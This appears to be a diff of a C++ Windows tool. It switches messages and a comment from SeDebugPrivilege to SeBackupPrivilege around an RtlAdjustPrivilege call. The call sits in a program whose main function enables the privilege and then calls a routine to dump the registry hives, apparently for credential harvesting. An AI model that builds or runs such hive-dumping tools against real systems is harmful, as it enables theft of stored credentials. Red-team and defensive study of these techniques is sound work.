@@ -24,12 +24,12 @@ BOOL EnablePrivilege()
         set_RtlAdjustPrivilege RtlHandle = (set_RtlAdjustPrivilege)RtlAdjustPrivilege_addr; 
         if (NT_SUCCESS(RtlHandle(17, TRUE, FALSE, &bRes)))
         {
-            cout << "[+] Successfully enabled SeDebugPrivilege via RtlAdjustPrivilege :)\n";
+            cout << "[+] Successfully enabled SeBackupPrivilege via RtlAdjustPrivilege :)\n";
             bRes = TRUE;
         }
         else
         {
-            cout << "[-] Failed to enable SeDebugPrivilege via RtlAdjustPrivilege :( " << GetLastError() << endl;
+            cout << "[-] Failed to enable SeBackupPrivilege via RtlAdjustPrivilege :( " << GetLastError() << endl;
 
             bRes = FALSE;
         }
@@ -63,7 +63,7 @@ void dump_RegHives() {
 
 int main() {
 
-    // Enable SeDebugPrivilege privilege
+    // Enable SeBackupPrivilege privilege
     BOOL privAdded = EnablePrivilege();
 
     // Dump Registry Hives
